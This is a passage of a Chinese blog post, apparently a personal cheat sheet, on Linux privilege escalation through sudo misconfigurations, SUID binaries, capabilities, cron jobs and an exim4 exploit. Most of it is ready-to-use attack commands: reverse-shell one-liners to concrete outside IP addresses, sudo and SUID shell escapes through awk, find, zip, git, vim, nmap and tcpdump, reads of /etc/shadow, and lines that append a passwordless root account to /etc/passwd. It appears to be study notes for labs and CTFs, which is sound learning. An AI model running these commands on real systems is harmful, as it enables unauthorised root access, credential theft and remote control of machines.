+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p><a href="https://www.cnblogs.com/f-carey/p/16026088.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.cnblogs.com/f-carey/p/16026088.html</a></p>
+<p>查找设置了capabilities的可执行文件</p>
+<pre tabindex="0"><code>getcap -r / 2&gt;/dev/null</code></pre><h5 id="sudo" class="heading-element"><span>0.0.0.6  sudo</span>
+  <a href="#sudo" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>首先用<code>sudo -l</code>找当前用户能否以管理员权限执行某些命令</p>
+<h6 id="mysql" class="heading-element"><span>0.0.0.6.1  mysql</span>
+  <a href="#mysql" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p><code>(root) NOPASSWD: /usr/bin/mysql</code></p>
+<p>直接用mysql -e</p>
+<pre tabindex="0"><code>sudo mysql -e &#39;\! /bin/sh &#39;(这样子提权需要有一个交互式shell)
+sudo mysql -e &#39;\! whoami &#39;(直接以root权限zhi)
+
+靶机：bash -c &#39;sh -i &amp;&gt;/dev/tcp/110.40.177.201/7788 0&gt;&amp;1&#39;
+或者  bash -i &gt;&amp; /dev/tcp/8.130.69.158/7788 0&gt;&amp;1
+或者  bash -c &#34;bash -i &gt;&amp; /dev/tcp/8.130.69.158/7788 0&gt;&amp;1&#34;</code></pre><p>sudo提权的命令集合</p>
+<pre tabindex="0"><code>提权命令：sudo awk &#39;BEGIN{system(&#34;/bin/bash&#34;)}&#39; #awk
+
+sudo find /home -exec /bin/bash \; #find
+
+sudo cat /etc/shadow #cat我们可以查看 /etc/shadow 文件中的账号密码，并使用john破解
+
+#####zip
+1.创建一个1.txt，将其压缩为1.zip
+2. sudo zip 1.zip 1.txt -T --unzip-command=&#34;sh -c /bin/bash&#34; 
+
+##### git
+1.sudo git help add 
+2.回车如下输入 !/bin/bash 
+
+#####ed
+sudo ed
+!/bin/sh
+
+#####vim
+sudo vim -c&#39;!sh&#39;
+
+#####man
+sudo man man
+之后按！按下并按Enter
+
+#####lesssud
+sudo less /etc/hosts 
+之后按！按下并按Enter
+
+#####more
+sudo more /etc/hosts
+之后按！按下并按Enter
+
+#####nmap
+echo &#34;os.execute(&#39;/bin/sh&#39;)&#34;&gt; /tmp/shell.nse &amp;&amp; sudo nmap --script = /tmp/shell.nse
+
+#####nano
+#####nano是使用此编辑器的文本编辑器，在您需要切换用户之后，您可以修改pvimasswd文件并将用户添加为root特权。在/etc/passwd中添加此行，以将用户添加为root特权。
+touhid:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash
+sudo nano /sudetc/passwd #现在切换用户密码是：test
+su touhid
+
+#####apache
+使用它我们可以查看系统文件
+sudo apache2 -f /etc/shadow</code></pre><h5 id="vi提权" class="heading-element"><span>0.0.0.7  vi提权</span>
+  <a href="#vi%e6%8f%90%e6%9d%83" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>可以用来进行rbash逃逸</p>
+<p>google了下相关信息，大概学到了两种方法适用</p>
+<p>一种是利用vi提权</p>
+<p>先后==在vi的命令模式下==执行以下两条指令</p>
+<pre tabindex="0"><code>:set shell=/bin/sh
+:shell</code></pre><h5 id="git提权" class="heading-element"><span>0.0.0.8  git提权</span>
+  <a href="#git%e6%8f%90%e6%9d%83" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>1.在本地配置多个用户身份信息。您可以使用以下命令为您的 Git 配置添加多个用户身份：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-arduino" data-lang="arduino"><span style="display:flex;"><span><span style="color:#58a1dd">git</span> <span style="color:#58a1dd">config</span> <span style="color:#ff636f">--</span><span style="color:#58a1dd">global</span> <span style="color:#58a1dd">user</span>.<span style="color:#58a1dd">name</span> <span style="color:#a6be9d">&#34;Your Name&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">git</span> <span style="color:#58a1dd">config</span> <span style="color:#ff636f">--</span><span style="color:#58a1dd">global</span> <span style="color:#58a1dd">user</span>.<span style="color:#58a1dd">email</span> <span style="color:#a6be9d">&#34;your-email@example.com&#34;</span></span></span></code></pre></div><p>在上述命令中，将 &ldquo;Your Name&rdquo; 和 &ldquo;<a href="https://link.juejin.cn/?target=mailto%3Ayour-email%40example.com"target="_blank" rel="external nofollow noopener noreferrer">your-email@example.com</a>&rdquo; 替换为您想要使用的用户名和电子邮件地址。</p>
+<p>2.在 Git 项目中使用另一个用户身份进行操作。要使用不同的用户身份进行 Git 操作，请使用以下命令：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ini" data-lang="ini"><span style="display:flex;"><span><span style="color:#58a1dd">git -c user.name</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;Another User&#34; -c user.email=&#34;another-user@example.com&#34; commit -m &#34;Commit message&#34;</span></span></span></code></pre></div><p>在上述命令中，将 &ldquo;Another User&rdquo; 和 &ldquo;<a href="https://link.juejin.cn/?target=mailto%3Aanother-user%40example.com"target="_blank" rel="external nofollow noopener noreferrer">another-user@example.com</a>&rdquo; 替换为您想要使用的另一个用户身份的用户名和电子邮件地址。请注意，在使用上述命令时，只会在该命令中使用指定的用户身份，不会更改您在全局 Git 配置中设置的默认用户身份。</p>
+<p>需要注意的是，使用另一个用户身份进行 Git 操作需要在您有相应的权限的情况下进行。因此，必须确保您已获得所需的权限，并且使用其他用户身份进行 Git 操作不应用于恶意目的。</p>
+<p>3.配合sudo</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307210012437.webp" alt="image-20230721001225087" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307210012437.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307210012437.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307210012437.webp?size=large 2x" data-title="image-20230721001225087" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<pre tabindex="0"><code>sudo git help config
+	!/bin/bash或者！&#39;sh&#39;完成提权
+sudo git  -p help
+	!/bin/bash</code></pre><h5 id="teehee提权" class="heading-element"><span>0.0.0.9  teehee提权</span>
+  <a href="#teehee%e6%8f%90%e6%9d%83" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>看看这个是干啥的，–help查看帮助</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308052210639.webp" alt="image-20230805221054346" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308052210639.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308052210639.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308052210639.webp?size=large 2x" data-title="image-20230805221054346" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>注意到<code>-a</code>参数可以直接在文件末尾加上字符串</p>
+<p>那么尝试往passwd写入一个账户</p>
+<p><code>/etc/passwd</code> 各个字段的含义：</p>
+<pre tabindex="0"><code>username:password:User ID:Group ID:comment:home directory:shell</code></pre><p>写入</p>
+<pre tabindex="0"><code>dongyu::0:0:::/bin/bash</code></pre><p>密码我们直接置空，uid和gid都是0，也就是root用户，也就是说覆盖了root账户，密码为0</p>
+<pre tabindex="0"><code>sudo teehee -a /etc/passwd
+dongyu::0:0:::/bin/bash
+su dongyu</code></pre><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308052221446.webp" alt="image-20230805222126217" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308052221446.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308052221446.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202308052221446.webp?size=large 2x" data-title="image-20230805222126217" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h5 id="suid" class="heading-element"><span>0.0.0.10  suid</span>
+  <a href="#suid" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>什么是SUID（<a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html"target="_blank" rel="external nofollow noopener noreferrer">来自P牛博客总结</a>）</p>
+<blockquote>
+<p>通常来说，Linux运行一个程序，是使用当前运行这个程序的用户权限，这当然是合理的。但是有一些程序比较特殊，比如我们常用的ping命令。</p>
+<p>ping需要发送ICMP报文，而这个操作需要发送Raw Socket。在Linux 2.2引入<a href="http://man7.org/linux/man-pages/man7/capabilities.7.html"target="_blank" rel="external nofollow noopener noreferrer">CAPABILITIES</a>前，使用Raw Socket是需要root权限的（当然不是说引入CAPABILITIES就不需要权限了，而是可以通过其他方法解决，这个后说），所以你如果在一些老的系统里<code>ls -al $(which ping)</code>，可以发现其权限是<code>-rwsr-xr-x</code>，其中有个s位，这就是suid：</p>
+<pre tabindex="0"><code>root@linux:~# ls -al /bin/ping
+-rwsr-xr-x 1 root root 44168 May 7 2014 /bin/ping</code></pre><p>suid全称是<strong>S</strong>et owner <strong>U</strong>ser <strong>ID</strong> up on execution。这是Linux给可执行文件的一个属性，上述情况下，普通用户之所以也可以使用ping命令，原因就在我们给ping这个可执行文件设置了suid权限。</p>
+<p>设置了s位的程序在运行时，其<strong>Effective UID</strong>将会设置为这个程序的所有者。比如，<code>/bin/ping</code>这个程序的所有者是0（root），它设置了s位，那么普通用户在运行ping时其<strong>Effective UID</strong>就是0，等同于拥有了root权限。</p>
+</blockquote>
+<p>这里引入了一个新的概念Effective UID。Linux进程在运行时有三个UID：</p>
+<ul>
+<li>Real UID 执行该进程的用户实际的UID</li>
+<li>Effective UID 程序实际操作时生效的UID（比如写入文件时，系统会检查这个UID是否有权限）</li>
+<li>Saved UID 在高权限用户降权后，保留的其原本UID（本文中不对这个UID进行深入探讨）</li>
+</ul>
+<p>通常情况下Effective UID和Real UID相等，所以普通用户不能写入只有UID=0号才可写的<code>/etc/passwd</code>；有suid的程序启动时，Effective UID就等于二进制文件的所有者，此时Real UID就可能和Effective UID不相等了。</p>
+<p>有的同学说某某程序只要有suid权限，就可以提权，这个说法其实是不准确的。只有这个程序的==所有者==是0号 root 或其他super user，同时拥有suid权限，才可以提权。</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309042138355.webp" alt="image-20230904213855055" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309042138355.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309042138355.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309042138355.webp?size=large 2x" data-title="image-20230904213855055" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<blockquote>
+<p>==SUID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID提权的思路就是运行root用户所拥有的SUID的文件，那么我们运行该文件的时候就得获得root用户的身份了。==</p>
+<p>已知的可用来提权的linux可行性的文件列表如下：</p>
+<p>*  nmap
+*  vim
+*  find
+*  bash
+*  more
+*  less
+*  nano
+*  cp</p>
+</blockquote>
+<p>查找具有suid权限的文件</p>
+<pre tabindex="0"><code>find / -perm -u=s -type f 2&gt;/dev/null
+find / -user root -perm -4000 -print 2&gt;/dev/null</code></pre><p>具体情况具体分析</p>
+<p><a href="https://pentestlab.blog/2017/09/25/suid-executables/"target="_blank" rel="external nofollow noopener noreferrer">https://pentestlab.blog/2017/09/25/suid-executables/</a></p>
+<pre tabindex="0"><code>#####Nmap
+nmap -V
+nmap --interactive #低版本的nmap可以使用进入交互界面
+
+nmap&gt; !sh
+sh-3.2# whoami
+root
+
+---
+nmap 新版
+echo &#34;os.execute(&#39;/bin/sh&#39;)&#34; &gt; /tmp/shell.nse &amp;&amp; sudo nmap --script=/tmp/shell.nse
+#####vim
+vim -c &#39;:py import os;os.execl(&#34;/bin/sh&#34;,&#34;sh&#34;,&#34;-pc&#34;,&#34;reset; exec sh -p&#34;)&#39;
+：shell #进入文本编辑器后执行
+
+#####find
+touch pentestlab
+find pentestlab -exec whoami \;
+
+#####Bash
+bash -p
+
+#####nano 尽可以查看文件
+nano  /etc/passwd
+
+#####apache2
+apache2 -f /etc/shadow
+
+#####tcpdump
+echo $&#39;id\ncat /etc/shadow&#39; &gt; /tmp/.test;chmod +x /tmp/.test;sudo tcpdump -ln -i eth0 -w /dev/null -W 100 -G 1 -z /tmp/.test -Z root</code></pre><h5 id="nmap" class="heading-element"><span>0.0.0.11  nmap</span>
+  <a href="#nmap" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>第一种</p>
+<p>直接创建一个脚本，利用nmap执行脚本获得一个root用户的shell</p>
+<pre tabindex="0"><code>nmap以root运行
+echo &#34;os.execute(&#39;/bin/bash&#39;)&#34;&gt;demon.nse
+#####nse是nmap的插件扩展名
+sudo nmap --script=/home/jens/demon.nse</code></pre><p>第二种</p>
+<pre tabindex="0"><code>nmap --interactive即可得到交互式shell
+nmap&gt;!bash    or     !sh</code></pre><h5 id="定时任务" class="heading-element"><span>0.0.0.12  定时任务</span>
+  <a href="#%e5%ae%9a%e6%97%b6%e4%bb%bb%e5%8a%a1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>如果root用户定时执行某个文件，可以想办法更改这个文件，写入恶意命令或反弹shell</p>
+<p>当root用户再次执行它，我们就拿到了root的shell</p>
+<h5 id="exim4" class="heading-element"><span>0.0.0.13  exim4</span>
+  <a href="#exim4" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><pre tabindex="0"><code>查看版本  exim4 --version
+漏洞库搜索一下  searchsploit exim 4 
+复制相关脚本到本地，再本地python搭个http服务，目标机shell上把脚本wget下来</code></pre></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-08-15 09:31:01">Updated on 2024-08-15&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E6%94%BB%E9%98%B2/" class="post-tag" title="Tags - 攻防">攻防</a><a href="/tags/%E6%8F%90%E6%9D%83/" class="post-tag" title="Tags - 提权">提权</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/linux/50/" class="post-nav-item" rel="prev" title="权限提升-Linux"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>权限提升-Linux</a>
+      <a href="/posts/owasp/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/110/" class="post-nav-item" rel="next" title="无参数rce">无参数rce<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">东隅</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
